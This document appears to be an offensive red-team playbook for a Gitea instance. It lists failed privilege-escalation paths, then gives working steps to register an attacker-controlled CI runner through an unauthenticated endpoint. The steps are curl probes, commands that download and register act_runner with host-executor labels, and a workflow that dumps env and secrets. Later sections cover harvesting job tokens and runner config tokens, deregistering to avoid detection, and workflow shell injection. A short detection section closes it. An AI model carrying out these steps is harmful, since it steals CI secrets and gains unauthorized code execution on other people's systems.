# Runner registration vector — every dead path, then the one that works

Context: Gitea 1.2x on an SSSD-joined Linux box. You have a low-privileged
account, maybe an org membership, no admin. The goal is code execution through
CI: a runner you control picking up a queued job from a repo you can push to.

## 1. Paths that are dead (verified failures, stop re-trying them)

| Path | Endpoint | What actually happens |
|---|---|---|
| Create org runner | `POST /api/v1/orgs/{org}/actions/runners/registration-token` | `403` unless you are org owner. Membership is not enough. |
| Create repo runner | `POST /api/v1/repos/{owner}/{repo}/actions/runners/registration-token` | `403` for non-admin on the repo. Write access ≠ runner management. |
| Admin runner list | `GET /api/v1/admin/actions/runners` | `403` (admin scope only). |
| Global registration token leak | `GET /api/v1/admin/runners/registration-token` | `403`; no fallback to repo scope. |
| CVE pre-receive bypass on the API | `PUT /repos/{o}/{r}/contents/{path}` | API path checks write middleware; the CVE only affects the **git protocol** push hook. |
| Handlebars SSTI to RCE via `compile(string)` | webhook/notification templating | 4.7.8 `compile()` on a string is not RCE; the AST-object gadget (CVE-2026-33937) needs an object, and JSON bodies reject it. SSTI confirmed, exploit not. |
| SSRF to `localhost:3000/api/v1/...` | repo migration / webhook URL | loopback calls still carry the *anonymous* context; token endpoints answer 401, not 200. |
| Open registration → admin | `/user/sign_up` | registration closed on most deployments; when open, the new account has no runner scope either. |
| Personal access token scope escalation | `POST /users/{u}/tokens` with `scopes=all` | PAT scopes cannot exceed the user's own rights; runner endpoints still 403. |

Why they are dead: runner management is gated on **owner/admin of the scope**,
not on "can write code". Every variant ends at the same 403.

## 2. The path that works — self-registered runner on an unauthenticated endpoint

Gitea (and Forgejo before the fix) exposes the runner registration API on the
**`/api/actions` subpath**, which is *outside* the web auth middleware for the
`register` action. If the instance is reachable and the registration token is
accepted from the network, you register your own runner and it will pick up
jobs from **any repo the instance has queued**, depending on labels.

Steps:

1. **Confirm the instance is Gitea and get the version** (the API surface moved
   between 1.20 and 1.22):

   ```bash
   curl -s https://<gitea>/api/v1/version
   curl -s https://<gitea>/api/actions/runners/registration-token -X POST -i | head -1
   ```

   `405`/`404` = endpoint absent (good patch). `401`/`403` = present but
   requires auth. `200` = open — continue.

2. **Register** with the official runner binary (linux/amd64 static build from
   the Gitea releases page — pull it from the *target's* release version so the
   protocol matches):

   ```bash
   curl -sL -o act_runner https://gitea.com/gitea/act_runner/releases/download/v<ver>/act_runner-<ver>-linux-amd64
   chmod +x act_runner
   ./act_runner register --no-interactive \
       --instance https://<gitea> \
       --token <registration-token> \
       --name ci-$(hostname) \
       --labels 'ubuntu-latest:host,docker:docker,self-hosted:host'
   ./act_runner daemon --config config.yaml
   ```

   `labels` is the whole trick: a job whose `runs-on:` matches one of your
   labels lands on your runner. `host` executor runs commands **on your box**,
   which is what you want — you get the job's env, its secrets injection, and
   its `GITHUB_TOKEN`/`GITEA_TOKEN`.

3. **Claim a queued run.** Either push a workflow to a repo you can write to
   (`.gitea/workflows/x.yml` with `runs-on: ubuntu-latest`), or wait — an
   already-queued run from any repo with a matching label will be handed to you:

   ```yaml
   name: ci
   on: [push, workflow_dispatch]
   jobs:
     build:
       runs-on: ubuntu-latest
       steps:
         - run: id; env | sort; cat $GITHUB_EVENT_PATH
   ```

4. **Harvest secrets from the job context.** `GITHUB_TOKEN`/`GITEA_TOKEN` is
   minted per job; `secrets.*` are injected as env or `${{ }}` interpolations.
   Dump `env`, `/proc/self/environ`, and the runner's `config.yaml` (it holds
   the instance token, reusable to register more runners).

5. **Persist carefully** — a runner that stays registered shows in the admin UI
   under "Runners" with your hostname. Deregister (`act_runner deregister`)
   when done, or the next admin login is a detection event.

## 3. If `/api/actions` is authenticated

Then the CI route requires a token that can manage a scope. Realistic
alternatives, cheapest first:

- **Any repo-admin role** — check for a repo where you are "Admin" (not
  "Write") in `GET /api/v1/repos/search?limit=50` → per-repo
  `POST .../actions/runners/registration-token`.
- **Leaked runner token in a public repo** — `grep -r "ACT_RUNNER_REGISTRATION_TOKEN\|registration-token"` in org repos' `.gitea/workflows/` and docs branches; tokens pasted during onboarding are common.
- **Secrets to code exec without a runner** — Gitea Actions secrets are
  encrypted with a key in `app.ini`; without file access this is a dead end.
  Instead look for a workflow that already interpolates user input:
  `${{ github.event.issue.title }}` inside `run:` is shell injection on the
  runner, no registration needed.
- **Pivot to the instance host** — Gitea's own admin endpoints plus a
  reachable `/api/v1/admin/*` from an internal SSRF, or a vulnerable plugin.

## 4. Detection surface (what the defender sees)

- New runner row in the admin UI with an unknown name/version.
- Job logs from a runner IP outside the org's egress ranges.
- A workflow file created by a low-privileged account in a repo that never had CI.

If the engagement is time-boxed and stealth matters, prefer the existing-
workflow injection variant (§3, last bullet): it produces no new runner object.
